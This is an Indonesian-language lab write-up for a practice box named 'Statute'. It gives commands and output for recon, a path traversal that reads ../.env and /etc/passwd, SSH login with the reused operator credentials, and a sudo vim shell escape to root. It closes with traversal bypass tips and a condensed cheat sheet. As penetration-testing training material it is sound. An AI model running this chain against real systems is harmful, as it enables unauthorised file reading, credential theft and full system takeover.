# Write-Up Lab Statute — Versi Closed Book

> **Ruang lingkup:** hanya untuk laboratorium atau sistem yang telah memberikan izin pengujian.

## 1. Gambaran Singkat

| Komponen | Nilai |
|---|---|
| Target | `192.168.56.120` |
| Web | `http://192.168.56.120:8080` |
| Celah awal | Path Traversal pada parameter `file` |
| Data ditemukan | Credential pada `.env` |
| Foothold | SSH sebagai `operator` |
| Privilege escalation | `sudo vim` |
| Akses akhir | `root` |

Rantai serangan:

```text
Recon
→ temukan endpoint download
→ uji file normal
→ ../.env
→ credential operator
→ SSH
→ sudo -l
→ Vim shell escape
→ root
```

## 2. Mnemonic: R-D-T-S-V-R

```text
R = Recon
D = Download
T = Traversal
S = SSH
V = Vim
R = Root
```

---

# Fase 1 — Recon dan Menemukan Endpoint Download

## 3. Scan Service

```bash
TARGET="192.168.56.120"
WEB="http://192.168.56.120:8080"

nmap -Pn -sC -sV -p22,80,8080 "$TARGET"
```

Temuan penting:

```text
22/tcp   open  ssh
80/tcp   open  http
8080/tcp open  http
```

Catat SSH, tetapi jangan menebak password. Credential akan dicari dari aplikasi web.

## 4. Directory Enumeration

```bash
dirsearch \
  -u "$WEB" \
  -e php,html,txt,bak,env
```

Endpoint penting:

```text
/download
/download.php
/documents
```

Buka aplikasi, klik salah satu tombol download, lalu lihat request pada Burp Suite atau Developer Tools.

Request normal:

```http
GET /download?file=uu-1-2024.pdf HTTP/1.1
Host: 192.168.56.120:8080
```

Petunjuk utama:

```text
Parameter file menerima nama file secara langsung.
```

---

# Fase 2 — Membuat Baseline dan Menguji Traversal

## 5. Baseline File Valid

```bash
curl --path-as-is -i \
  "$WEB/download?file=uu-1-2024.pdf"
```

Indikator:

```text
HTTP/1.1 200 OK
Content-Type: application/pdf
```

## 6. Baseline File Tidak Ada

```bash
curl --path-as-is -i \
  "$WEB/download?file=missing.pdf"
```

Indikator:

```text
HTTP/1.1 404 Not Found
```

Tujuan baseline adalah membedakan respons normal, error, dan traversal berhasil.

## 7. Membaca `.env`

```bash
curl --path-as-is -i \
  -H 'User-Agent: Mozilla/5.0' \
  "$WEB/download?file=../.env"
```

Indikator berhasil:

```text
HTTP/1.1 200 OK
Content-Disposition: attachment; filename=".env"

DB_USERNAME=operator
DB_PASSWORD=<PASSWORD_DARI_ENV>
DB_DATABASE=jdih
```

Mengapa berhasil:

```text
documents/../.env
↓
.env pada root aplikasi
```

Temuan ini membuktikan **Path Traversal / Arbitrary File Read**.

Validasi tambahan yang cukup:

```bash
curl --path-as-is -i \
  -H 'User-Agent: Mozilla/5.0' \
  "$WEB/download?file=../../../../../etc/passwd"
```

Hentikan setelah bukti minimum diperoleh. Tidak perlu membaca `/etc/shadow`, private key, atau data sensitif lain.

---

# Fase 3 — Credential Reuse ke SSH

## 8. Hubungkan Dua Temuan

```text
Nmap menemukan SSH
+
.env menemukan username dan password
=
uji credential reuse pada SSH
```

Login:

```bash
ssh operator@192.168.56.120
```

Masukkan password yang ditemukan pada `DB_PASSWORD`.

Verifikasi:

```bash
whoami
id
hostname
pwd
```

Indikator:

```text
operator
statute
/home/operator
```

---

# Fase 4 — Enumerasi Sudo

## 9. Periksa Hak Sudo

```bash
sudo -l
```

Temuan lab:

```text
(root) /usr/bin/vim
```

atau:

```text
(root) NOPASSWD: /usr/bin/vim
```

Vim berbahaya bila dijalankan sebagai root karena mendukung shell escape:

```vim
:!/bin/sh
```

Rumus hafalan:

```text
sudo editor + shell escape = root shell
```

---

# Fase 5 — Root melalui Vim

## 10. Cara Singkat

```bash
sudo vim -c ':!/bin/sh'
```

Verifikasi:

```bash
whoami
id
```

Indikator:

```text
root
uid=0(root) gid=0(root)
```

## 11. Cara Interaktif

```bash
sudo vim
```

Di dalam Vim:

```vim
:!/bin/sh
```

Keluar dari shell:

```bash
exit
```

Keluar dari Vim tanpa menyimpan:

```vim
:q!
```

---

# 12. Troubleshooting Inti

### `/download` menghasilkan `400`

Endpoint mungkin ada, tetapi parameter `file` wajib diisi. Lihat request saat tombol download normal diklik.

### `../.env` menghasilkan `403`

Tambahkan User-Agent browser:

```bash
curl --path-as-is -i \
  -H 'User-Agent: Mozilla/5.0' \
  "$WEB/download?file=../.env"
```

### `../.env` menghasilkan `404`

Coba kedalaman terbatas atau encoded slash:

```text
../../.env
..%2F.env
```

Jangan melakukan brute force path tanpa arah. Gunakan struktur aplikasi dan respons baseline sebagai petunjuk.

---

# 13. Cheat Sheet 60 Detik

```bash
TARGET="192.168.56.120"
WEB="http://192.168.56.120:8080"

# 1. Recon
nmap -Pn -sC -sV -p22,80,8080 "$TARGET"
dirsearch -u "$WEB" -e php,html,txt,bak,env

# 2. Baseline
curl --path-as-is -i "$WEB/download?file=uu-1-2024.pdf"
curl --path-as-is -i "$WEB/download?file=missing.pdf"

# 3. Traversal
curl --path-as-is -i \
-H 'User-Agent: Mozilla/5.0' \
"$WEB/download?file=../.env"

# 4. SSH
ssh operator@"$TARGET"

# 5. Sudo dan root
sudo -l
sudo vim -c ':!/bin/sh'
id
```

## Kalimat Hafalan

```text
Temukan download, pahami parameter file, buat baseline,
baca ../.env, login operator, cek sudo, escape dari Vim, root.
```
